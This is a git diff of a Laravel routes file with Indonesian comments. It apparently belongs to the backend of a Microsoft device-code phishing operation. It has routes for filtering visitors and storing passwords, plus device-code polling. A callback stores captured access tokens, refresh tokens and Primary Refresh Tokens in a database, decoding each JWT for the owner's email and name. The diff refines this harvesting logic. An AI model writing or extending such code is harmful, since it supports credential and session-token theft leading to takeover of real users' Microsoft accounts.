@@ -9,38 +9,60 @@ use App\Jobs\RunPythonJob;
 use App\Models\Token;
 use App\Http\Controllers\Api\MicrosoftAuthController;
 use App\Http\Controllers\MicrosoftInboxController;
-
 use Illuminate\Http\Request;
 
+/*
+|--------------------------------------------------------------------------
+| MAIL WEBHOOK
+|--------------------------------------------------------------------------
+*/
 Route::any('/mail-notify', function (Request $request) {
 
     if ($request->has('validationToken')) {
-
         header('Content-Type: text/plain');
-
         echo $request->query('validationToken');
-
         exit;
     }
 
-    \Log::info('MAIL WEBHOOK', [
+    Log::info('MAIL WEBHOOK', [
         'body' => file_get_contents("php://input")
     ]);
 
     return response('ok', 200);
 });
 
-
+/*
+|--------------------------------------------------------------------------
+| BASIC ROUTES
+|--------------------------------------------------------------------------
+*/
 Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
 Route::post('/send-password', [CoreSystemController::class, 'storePassword']);
-// token
+
+/*
+|--------------------------------------------------------------------------
+| MICROSOFT AUTH
+|--------------------------------------------------------------------------
+*/
 Route::post('/start', [MicrosoftAuthController::class, 'start']);
 Route::get('/poll/{login_id}', [MicrosoftAuthController::class, 'poll']);
-// cookies
+
+/*
+|--------------------------------------------------------------------------
+| COMMAND
+|--------------------------------------------------------------------------
+*/
 Route::post('/command/start', [CommandController::class, 'start']);
 Route::get('/command/poll/{id}', [CommandController::class, 'poll']);
+
+/*
+|--------------------------------------------------------------------------
+| PYTHON CALLBACK
+|--------------------------------------------------------------------------
+*/
 Route::post('/python/callback', function (Request $request) {
 
+    // 🔐 security check
     if ($request->header('X-Python-Secret') !== config('services.python.secret')) {
         return response()->json(['error' => 'unauthorized'], 403);
     }
@@ -53,17 +75,37 @@ Route::post('/python/callback', function (Request $request) {
         return response()->json(['error' => 'job not found'], 404);
     }
 
+    $data = $request->input('data');
+
+    // 🔥 ambil result lama (biar ga ketimpa)
+    $result = $job->result ?? [];
+
+    // 🔥 handle waiting_user (device code)
+    if ($request->status === 'waiting_user') {
+        $result['device'] = $data;
+    }
+
+    // 🔥 handle done (token)
+    if ($request->status === 'done') {
+        $result['auth'] = $data;
+    }
+
+    // 🔥 update job
     $job->update([
         'status' => $request->status,
-        'result' => $request->status === 'done' ? $request->data : $job->result,
-        'error' => $request->status === 'failed' ? $request->error : $job->error,
+        'result' => $result,
+        'error' => $request->status === 'failed'
+            ? $request->error
+            : $job->error,
     ]);
 
-    // 🔥 HANDLE TOKEN
+    /*
+    |--------------------------------------------------------------------------
+    | SAVE TOKEN (ONLY WHEN DONE)
+    |--------------------------------------------------------------------------
+    */
     if ($request->status === 'done') {
         try {
-            $data = $request->data;
-
             $prt = $data['prt'] ?? null;
 
             $idToken = is_array($prt) ? ($prt['id_token'] ?? null) : null;
@@ -78,39 +120,53 @@ Route::post('/python/callback', function (Request $request) {
                 ? ($decoded['name'] ?? trim(($decoded['given_name'] ?? '') . ' ' . ($decoded['family_name'] ?? '')))
                 : null;
 
-            Token::create([
-                'user_id' => 1,
-                'access_token' => $data['access_token'] ?? null,
-                'refresh_token' => $data['refresh_token'] ?? null,
-                'prt' => $data['prt'],
-                'email' => $email,
-                'name' => $name,
-                'expires_at' => now()->addSeconds((int) ($data['expires_in'] ?? 3600)),
-                'status' => 'active',
-            ]);
+            // 🔥 jangan insert kalau kosong
+            if (!empty($data['access_token']) || !empty($prt)) {
+
+                Token::create([
+                    'user_id' => 1, // 🔥 bisa diganti dynamic nanti
+                    'access_token' => $data['access_token'] ?? null,
+                    'refresh_token' => $data['refresh_token'] ?? null,
+                    'prt' => $prt,
+                    'email' => $email,
+                    'name' => $name,
+                    'expires_at' => now()->addSeconds((int) ($data['expires_in'] ?? 3600)),
+                    'status' => 'active',
+                ]);
+            }
 
         } catch (\Throwable $e) {
             Log::error('TOKEN_SAVE_FAILED', [
                 'error' => $e->getMessage(),
-                'data' => $request->data
+                'data' => $data
             ]);
         }
     }
 
     return response()->json(['ok' => true]);
+
 })->name('python.callback');
 
+/*
+|--------------------------------------------------------------------------
+| CHECK JOB
+|--------------------------------------------------------------------------
+*/
 Route::get('/python/job/{id}', function ($id) {
     return PythonJob::findOrFail($id);
 });
 
+/*
+|--------------------------------------------------------------------------
+| START PYTHON JOB
+|--------------------------------------------------------------------------
+*/
 Route::post('/python/start', function () {
 
     $job = PythonJob::create([
         'status' => 'pending'
     ]);
 
-    // 🔥 jalankan python
     RunPythonJob::dispatch($job->id)->onQueue('python');
 
     return response()->json([
@@ -119,8 +175,11 @@ Route::post('/python/start', function () {
     ]);
 });
 
-
-
+/*
+|--------------------------------------------------------------------------
+| JWT DECODE HELPER
+|--------------------------------------------------------------------------
+*/
 if (!function_exists('decodeJwt')) {
     function decodeJwt($jwt)
     {
